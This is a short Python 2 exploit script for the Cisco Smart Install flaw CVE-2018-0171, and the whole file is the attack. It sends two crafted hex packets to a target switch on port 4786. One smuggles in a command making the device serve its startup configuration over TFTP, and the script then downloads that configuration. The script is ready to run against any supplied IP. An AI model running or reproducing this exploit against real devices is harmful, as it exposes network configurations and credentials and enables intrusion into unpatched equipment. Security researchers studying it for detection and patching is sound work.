#!/usr/bin/python
#
# C. Papathanasiou (2018)
# Cisco Smart Install Exploit
# CVE-2018-0171 
# 


import socket
import sys
import time
import os 
import tftpy
string = "00000001000000010000000A00000050FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF555CCA6800000000000000000000000000000000FFFFFFFF00000001".decode("hex")
string2 = "000000010000000100000008000001680001001400000001000000000021D863A560000000020154636F6E66696775726520746674702D736572766572206E7672616D3A737461727475702D636F6E666967000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000".decode("hex")
ip = sys.argv[1] 
port = 4786 
srvsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srvsock.settimeout(3) 
srvsock.connect((ip, port))
print "sending packets"
srvsock.sendall(string)
srvsock.sendall(string2)
srvsock.close()
print "sleeping 5 seconds"
time.sleep(5)
print "downloading config"
filename = "%s-config" % sys.argv[1]
try:
	client = tftpy.TftpClient(sys.argv[1], 69)
	client.download('startup-config', filename)
	print "config downloaded!"
except:
	print "failed"
